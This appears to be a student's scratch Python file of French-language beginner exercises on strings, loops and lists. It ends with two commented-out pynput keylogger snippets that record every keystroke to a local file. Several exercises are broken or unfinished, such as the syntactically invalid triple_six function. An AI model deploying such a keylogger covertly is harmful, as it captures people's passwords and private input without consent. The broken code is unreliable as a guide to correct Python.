#exercice 1
'''
vrai
faux 
vrai
faux 
vrai
vrai
vrai
faux
'''
#exercice 2
'''
B
j
7
print([7])IndexError
br
brrrr
yes there is 
false minuscule
true
false
bonjoura
bonjourbonjour
'''
#exercice3
'''
a="2"
b=3
a=a+"1"
b=a+"b"
print(a,b)=21 21b
'''
'''
A='a'
B='b'
A=A*2
B=A+B
print(A,B)=aab
'''
'''
a=0
b=1
a=a+b
b='a'+'b'
print(a,b)=1 ab
'''

'''
a='b'
b='a'
a=a*2
b=a+b
print(a,b)=bba
'''
#exercice4
'''def chaine(c,n):
    if n>0:
        return c*n
    else:
        return False 
ch='c'
number=3
result=chaine(ch,number)
print(result)'''
    
'''def chaine_2 (c,d,n,m):
    if (n>0 and m>0):
       return (c*n + d*m) 
    else:
        return False 
ch_1='c'
number_1=2
chh='d'
number_2=2
result=chaine_2(ch_1,chh,number_1,number_2)
print(result)'''

#exercie 6
'''def chaine_ch(ch,n):
    if n>0:
      for i in range(n):
        print(ch)
    else:
            return False
a='ch'
b=2
result=chaine_ch(a,b)
print(a,b)
'''

'''def chaine_ch(ch,n):
    if n>0:
        for i in range(1, n+1):
            print(f'❴i❵.❴ch❵')'''

#exercice 7
'''def exercice_7(c,n):
    if n>0:
        for i in range (1,n+1):
            print(c*i)
exercice_7("c",5)'''

#exercice 8
'''def premiere_occ(ch,c):
    k=0
    for i in range (len(ch)):
        if ch[i]==c:
            k=k+1
    return k
print(premiere_occ('aabdac','a'))'''


'''def premiere_occ(ch,c):
    k=0
    for i in range (len(ch)):
        if ch[i]==c:
            k=k+1
            return k
        else:
            return"valeur vide" '''
#ex10
'''def sous_chaine(ch1,ch2):
    if ch1 in ch2:
        return True
    if ch2 in ch1:
        return True
    else:
        return False'''

#ex 11#prgramme 1

'''ch=''
for k in range (1,5):
    if k %2==1:
        ch+='a'
    else:
        ch+='b'
print(ch)'''







#COURS RHIM
'''message='bonjour le'+' '+'monde'
print(len(message))'''

'''message_1='bonjour '*3
message_2='le monde'
print(message_1+message_2)'''

'''message_3='bonjour'
message_3+=' '
message_3+='le monde'
print(message_3)'''

'''message_5="bonjour le monde"
message_5=message_5.find("oiseau")
print(message_5)'''

'''message7="BONJOUR LE MONDE"
message7a=message7.lower()ou upper
print(message7a)'''

'''message8="bonjour le monde"
messagea=message8.replace("l","pizza")
print(messagea)'''

'''message9="bonjour le monde"
message9a=message9[1:9]
print(message9a)'''

'''message9="bonjour le monde"
debut=1
fin=9
message9b=message9 [debut:fin]
print (message9b)
'''
'''print('bonjour\tbonjour\tbonjour\nle monde\tmonde')'''


'''message="anis"
message1=message.replace("anis","sina")
print(message1)


inverse="anis"
inverse1=inverse[::-1]
print(inverse1)

string='anis'
inverse = ''
for i in string :
    inverse = i + inverse 
print (inverse )'''


'''import matplotlib.pyplot as plt
import numpy as np
plt.axis([-8,3,-5,5])
x=np.linspace(-7,2,50)
y=x**3/6-2*x+1
plt.plot(x,y)
plt.show'''

#ex 12
'''def triple_six(ch):
    return "666" in ch
print(triple_six("anis 666"))

def triple_six_exact(ch):
    n=len(ch)
    if ch[0:3]=="666" and(n==3 or ch[3 ='6']):
        return True
    if ch[n-3:n]=="666" and n==4 or ch
        return True 
for k in range(1,n+1):
    if ch[k:k+3]=="666"and       and 
    return True 
return False'''

#ex13
#partie 2
'''def palindrome(ch):
    if ch==ch[::-1]:
        return True 
    else:
        return False


def sans_espace(ch):
    mot=""
    for i in range(len(ch)):
        if ch[i]!=" ":
            mot=mot+ch[i]
    return mot
print (sans_espace(" "))
'''
'''import random
def aleatoire ():
    pwd=""
    for i in range(4):
        pwd=pwd+str(random.randint(0,9))
    with open("test_python.txt", "w") as fichier:
        fichier.write(pwd)
    return pwd

tentative=2
mdp='ANIS1234'
while tentative>0:
    pwd=input('entrez votre mot de passe:')
    if mdp==pwd:
        print ("le mot de passe est correct")
        break
    elif pwd!=mdp:
        print('le mot de passe est incorrect')
        tentative=tentative-1
        print ("il vous reste",tentative,"essais")
        if tentative==0:
            print('on vous hack')
            aleatoire()'''




import random
def aleatoire ():
    pwd=""
    for i in range(4):
        pwd=pwd+str(random.randint(0,9))
    with open("test_python.txt", "w") as fichier:
        fichier.write(pwd)
    return pwd

tentative=5
mdp='ANIS1234'
while tentative>0:
    pwd=input('entrez votre mot de passe:')
    if mdp==pwd:
        print ("le mot de passe est correct")
        break
    elif pwd!=mdp:
        print('le mot de passe est incorrect')
        tentative=tentative-1
        print ("il vous reste",tentative,"essais")
        if tentative==0:
            print('on vous hack')
            aleatoire()
            


















#programme 1
'''L=[]
for k in range(1,101):
    L +=[k]
print(L)'''

#programme 2
'''L=[]
for k in range(1,101):
    L.append(k)
print(L)'''

#programme 3
'''L=[]
L=100*[0]
for k in range (100):
    L[k]=k+1
print(L)'''

#partie 2
'''L=[]
for k in range(1,101):
    L +=[k*2]
print(L)
 #partie 3

def carre(n):
    for k in range'''
#exercice 18

'''import smtplib
from email.message import *

username = ''
password = ''

def sendmail(username, password):'''



#keylogger

'''from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()'''


'''from pynput import keyboard
import logging


logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

def on_release(key):
    if key == keyboard.Key.esc:
        
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()'''

    











    
    















